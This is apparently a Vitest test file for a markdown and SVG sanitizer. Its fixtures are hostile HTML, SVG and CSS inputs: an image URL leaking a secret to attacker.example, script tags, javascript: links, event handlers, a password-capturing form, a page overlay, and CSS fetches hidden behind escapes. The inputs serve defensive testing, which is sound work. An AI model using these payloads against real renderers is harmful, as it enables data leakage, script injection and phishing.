import { describe, expect, it } from "vitest";
import { renderMarkdown, sanitizeSvg } from "./sanitize-html";

function dom(html: string): HTMLDivElement {
  const host = document.createElement("div");
  host.innerHTML = html;
  return host;
}

describe("renderMarkdown (#2099)", () => {
  it("rewrites an external image to a link so the browser never fetches it", async () => {
    const host = dom(await renderMarkdown("![shot](https://attacker.example/x?d=secret)"));
    expect(host.querySelector("img")).toBeNull();
    const a = host.querySelector("a")!;
    expect(a.getAttribute("href")).toBe("https://attacker.example/x?d=secret");
    expect(a.textContent).toBe("shot");
    expect(a.target).toBe("_blank");
    expect(a.rel).toBe("noopener noreferrer");
  });

  it("treats protocol-relative src as external and labels alt-less images with the URL", async () => {
    const host = dom(await renderMarkdown('<img src="//attacker.example/b">'));
    expect(host.querySelector("img")).toBeNull();
    expect(host.querySelector("a")?.textContent).toBe("//attacker.example/b");
  });

  it("keeps data: and same-origin images", async () => {
    const png = "data:image/png;base64,iVBORw0KGgo=";
    const host = dom(await renderMarkdown(`![a](${png}) ![b](/icons/x.png)`));
    const srcs = [...host.querySelectorAll("img")].map((i) => i.getAttribute("src"));
    expect(srcs).toEqual([png, "/icons/x.png"]);
  });

  it("drops forms, controls, style and other fetch paths", async () => {
    const host = dom(
      await renderMarkdown(
        [
          '<form action="https://e.example"><input name="pw"><button>go</button><textarea></textarea></form>',
          '<div style="position:fixed;inset:0">overlay</div>',
          "<style>body{display:none}</style>",
          '<video poster="https://e.example/p"></video><svg><image href="https://e.example/s"/></svg>',
          '<table background="https://e.example/bg"><tr><td>t</td></tr></table>',
          '<img src="/ok.png" srcset="https://e.example/s 2x">',
        ].join("\n"),
      ),
    );
    for (const sel of ["form", "input", "button", "textarea", "style", "video", "svg", "[style]"])
      expect(host.querySelector(sel), sel).toBeNull();
    expect(host.querySelector("table")?.hasAttribute("background")).toBe(false);
    expect(host.querySelector("img")?.hasAttribute("srcset")).toBe(false);
    expect(host.textContent).toContain("overlay");
  });

  it("keeps GFM task-list checkboxes, inert", async () => {
    const host = dom(await renderMarkdown("- [x] done\n- [ ] todo"));
    const boxes = [...host.querySelectorAll("input")];
    expect(boxes).toHaveLength(2);
    expect(boxes.every((b) => b.type === "checkbox" && b.disabled)).toBe(true);
  });

  it("strips scripts, handlers and non-http link schemes", async () => {
    const host = dom(
      await renderMarkdown(
        '<script>x()</script><a href="javascript:alert(1)" onclick="x()">j</a> [t](tel:123)',
      ),
    );
    expect(host.querySelector("script")).toBeNull();
    const links = [...host.querySelectorAll("a")];
    expect(links.every((a) => !a.hasAttribute("href") && !a.hasAttribute("onclick"))).toBe(true);
  });

  it("opens off-app links in a new tab but leaves fragment links alone", async () => {
    const host = dom(await renderMarkdown("[d](https://example.com/d) [s](#steps)"));
    const [ext, frag] = host.querySelectorAll("a");
    expect(ext!.target).toBe("_blank");
    expect(ext!.rel).toBe("noopener noreferrer");
    expect(frag!.hasAttribute("target")).toBe(false);
  });

  it("strips a forged session-link marker", async () => {
    const host = dom(await renderMarkdown('<a href="#" data-session-id="s1">TASK-1</a>'));
    expect(host.querySelector("[data-session-id]")).toBeNull();
  });
});

describe("sanitizeSvg (#2104)", () => {
  const svg = [
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">',
    "<style>@import url(https://e.example/a.css);.n{fill:red;background:url(https://e.example/b)}.m{filter:url(#m)}</style>",
    '<defs><marker id="m"><path d="M0 0"/></marker></defs>',
    '<script>alert(1)</script><g onclick="alert(1)" style="fill:blue;background-image:url(https://e.example/c)"><rect class="n" width="5" height="5"/></g>',
    '<foreignObject width="50" height="20"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Label</span></div></foreignObject>',
    '<a href="https://e.example"><text>ext</text></a><image href="https://e.example/i.png"/><path marker-end="url(#m)" d="M0 0"/>',
    "</svg>",
  ].join("");

  it("removes scripts, handlers and outside references but keeps labels, styles and local refs", async () => {
    const host = dom(await sanitizeSvg(svg));
    expect(host.querySelector("script")).toBeNull();
    expect(host.querySelector("[onclick]")).toBeNull();
    expect(host.querySelector("g")?.getAttribute("style")).not.toContain("e.example");
    expect(host.querySelector("foreignObject span")?.textContent).toBe("Label");
    const css = host.querySelector("style")?.textContent ?? "";
    expect(css).toContain("fill:red");
    expect(css).toContain("url(#m)");
    expect(css).not.toContain("e.example");
    expect(host.querySelector("a")?.hasAttribute("href")).toBe(false);
    expect(host.querySelector("image")?.hasAttribute("href") ?? false).toBe(false);
    expect(host.querySelector("marker#m")).not.toBeNull();
    expect(host.querySelector("path[marker-end]")?.getAttribute("marker-end")).toBe("url(#m)");
  });

  it("drops media and image elements inside a foreignObject", async () => {
    const host = dom(
      await sanitizeSvg(
        [
          '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="9" height="9">',
          '<div xmlns="http://www.w3.org/1999/xhtml"><span>ok</span>',
          '<audio src="https://e.example/a"></audio><video src="https://e.example/v" poster="https://e.example/p"><source src="https://e.example/s"><track src="https://e.example/t"></video>',
          '<picture><source srcset="https://e.example/p2"></picture><img src="https://e.example/i">',
          "</div></foreignObject></svg>",
        ].join(""),
      ),
    );
    expect(host.querySelector("span")?.textContent).toBe("ok");
    expect(host.innerHTML).not.toContain("e.example");
  });

  it("neutralises an unterminated url( and url() in presentation attributes", async () => {
    const host = dom(
      await sanitizeSvg(
        '<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(https://e.example/p.svg#g)" cursor="url(https://e.example/c),auto" style="fill:red;background:url(https://e.example/f"/><path fill="url(#m)"/></svg>',
      ),
    );
    expect(host.innerHTML).not.toContain("e.example");
    expect(host.querySelector("rect")?.getAttribute("style")).toContain("fill:red");
    expect(host.querySelector("path")?.getAttribute("fill")).toBe("url(#m)");
  });

  it.each([
    "ur\\l(https://e.example/f)",
    "\\75 rl(https://e.example/f)",
    "@\\69mport 'https://e.example/a.css';",
  ])("drops CSS whose escapes could hide a fetch: %s", async (css) => {
    const font = `@font-face{font-family:x;src:${css}}`;
    const host = dom(
      await sanitizeSvg(
        `<svg xmlns="http://www.w3.org/2000/svg"><style>${font}</style><g style="background:${css}"><rect/></g></svg>`,
      ),
    );
    expect(host.querySelector("style")?.textContent ?? "").toBe("");
    expect(host.querySelector("g")?.hasAttribute("style")).toBe(false);
    expect(host.innerHTML).not.toContain("e.example");
  });
});
